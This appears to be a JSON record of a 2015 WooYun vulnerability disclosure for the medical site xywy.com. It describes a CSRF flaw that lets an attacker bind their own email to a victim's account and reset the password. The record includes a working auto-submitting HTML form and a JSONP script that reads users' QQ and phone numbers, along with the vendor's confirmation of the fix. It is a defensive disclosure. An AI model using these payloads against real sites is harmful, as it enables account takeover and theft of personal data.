{"id": 27945, "wybug_id": "wooyun-2015-0124033", "wybug_title": "寻医问药可劫持重置任意用户帐号密码", "wybug_corp": "寻医问药", "wybug_author": "jeary", "wybug_date": "2015-07-02 10:22", "wybug_open_date": "2015-08-14 09:35", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 之前用敏感接口的问题可以与用户交互获取密码进入账号，然而已经修复了，可这还是无法阻止我进入他人的账号~ 详细说明：  由于寻医问药全站都没有防止CSRF，就在我以为敏感操作被被我提交得差不多的时候，我看见了账号认证这个功能。\n\n这个发送认证邮件是存在CSRF的，导致可以绑定攻击者的邮箱，然后即可重置密码。请求如下：\nPOST /ajax/sendMail.php HTTP/1.1newemail=2209229046@qq.com&oldemail=*********@qq.com\n一开始我以为如果用户绑定过邮箱，我就必须得找到用户使用的邮箱，这样就略显鸡肋的，我还特地找了办法来劫持获取邮箱，经过测试后发现oldemail是多余的，删除此参数，依然可以发送认证邮件。POC：（oldEmail已经注释了）\n<html>  <body>    <form action=\"http://user.app.xywy.com/ajax/sendMail.php\" method=\"POST\">      <input type=\"hidden\" name=\"newemail\" value=\"root@jeary.org\" />      <!--<input type=\"hidden\" name=\"oldemail\" value=\"*********@qq.com\" /> -->        </form>    <script>      document.forms[0].submit();    </script>  </body></html>\n（POC访问效果去证明看图~~）PS：虽然这里不需要知道用户使用的当前邮箱账号，不过既然找到了，顺便发出来~~这里使用接口获取用户邮箱、手机号、邮箱，在需要oldmail的情况下可以将两个POC改一下写在一起。\n<!DOCTYPE html><html><head><script src=\"https://code.jquery.com/jquery-1.9.1.min.js\"></script>  <meta charset=\"GBK\">  <title>POC</title></head><body><p>result:</p><script>$.getJSON('http://ucenter.xywy.com/index.php?act=api_data&apitype=left&callback=?',function(json){document.body.appendChild(document.createElement('p')).innerHTML=json.content.qq+\"<br/>\"+json.content.phone+\"<br/>\"+json.content.telephone;;})</script></body></html>\n效果：\n\n   漏洞证明：  \n\n然后点击邮箱里的链接即可绑定攻击者的邮箱，然后去使用忘记密码功能重置密码即可。危害较大，求不小厂商~~   修复方案：  1.token2.referer3.callback   版权声明：转载请注明来源 jeary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-02 10:31 厂商回复： 对于那些表面存在然而实际并没卵用的前端验证防御机制我也是醉了，一定严肃处理。。 最新状态： 2015-08-14：已修复。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}